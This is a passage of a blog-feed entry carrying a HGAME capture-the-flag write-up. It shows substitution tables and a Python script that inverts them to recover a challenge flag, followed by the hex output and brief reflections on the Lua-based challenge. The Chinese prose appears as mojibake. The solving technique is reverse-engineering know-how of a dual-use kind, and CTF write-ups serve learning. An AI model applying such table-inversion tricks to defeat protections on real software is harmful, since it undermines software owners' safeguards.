<span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">]</span>
<span class="token punctuation">,</span> 
<span class="token punctuation">[</span><span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
answer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">80</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">[</span><span class="token number">79</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>tables<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>tables<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>answer<span class="token punctuation">[</span><span class="token number">79</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è¿™ä¸€æ®µè¾“å‡ºå·²ç»åŠ å¯†çš„æ¯”ç‰¹æµã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">08 bc 48 bf 48 e7 ff 28 66 22 84 9c 74 f5 f2 66 0a 81 c0 65 dd 0f c7 a4 fa be c2 0f a4 d2 bd 81 57 b6 2c c0 be e7 98 64 22 c6 1b 76 ad 93 3f 8a 20 5b b6 a3 01 87 35 87 05 a9 fa dd e4 51 7f bd a9 86 c1 e7 8b 03 94 6a 0e 49 92 fc 80 12 bb 92  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>ç„¶åå†å¤åˆ¶åˆ° block ä¸­ ä¿®æ”¹æ ‡å¿—ä½ï¼Œå†è§£å¯†ï¼</p>
<p>result</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/result.png" alt="result"></p>
<p>å¤§èƒœåˆ©ï¼Œå¥½è€¶ã€‚</p>
<p>çœŸçš„å­¦äº›äº†å¥½å¤šï¼Œå°¤å…¶æ˜¯ lua çš„æºä»£ç ï¼Œå¯è¯»æ€§è¶…å¼ºã€‚</p>
<p>ä¸è¿‡æœ‰ä¸€äº›è¿˜ä¸æ˜ç™½ï¼Œæ€ä¹ˆåšåˆ°æŠŠè¿™ä¸ª lua è™šæ‹Ÿæœºç§»æ¤åˆ°ç¨‹åºå†…çš„ï¼Œè¿™ä¸ªå¾ˆæœ‰æ„æ€ã€‚åº”è¯¥è¿˜æœ‰åˆ«çš„åšæ³•ï¼Œæ¯”å¦‚ hook å‡½æ•°ä»€ä¹ˆçš„ï¼Œä¸è¿‡æˆ‘è¿˜ä¸æ¸…æ¥šé‚£äº›ï¼Œæˆ–è€…è¯´é‡åˆ°äº†æˆ‘ä¹Ÿç”¨åˆ«çš„æ–¹æ³•è§£å†³äº†ã€‚</p>
<p>ä¸è¿‡æœ€åæœ€åï¼Œæˆ‘æ„Ÿè§‰æœ€é‡è¦çš„åº”è¯¥è¿˜æ˜¯æ€ä¹ˆåˆ¶ä½œå‡ºè¿™ä¸ªç¨‹åºï¼ŒçœŸçš„å¾ˆæƒŠè‰³ã€‚å¤ªå¦™äº†ï¼Œä¸€é“é¢˜è®©æˆ‘å­¦ä¹ äº†ä¸€é—¨è¯­è¨€å¤–åŠ ä¸€äº›éªšæ“ä½œã€‚</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK3_WP</title>
    <url>/2021/03/14/HGAME_WEEK3_WP/</url>
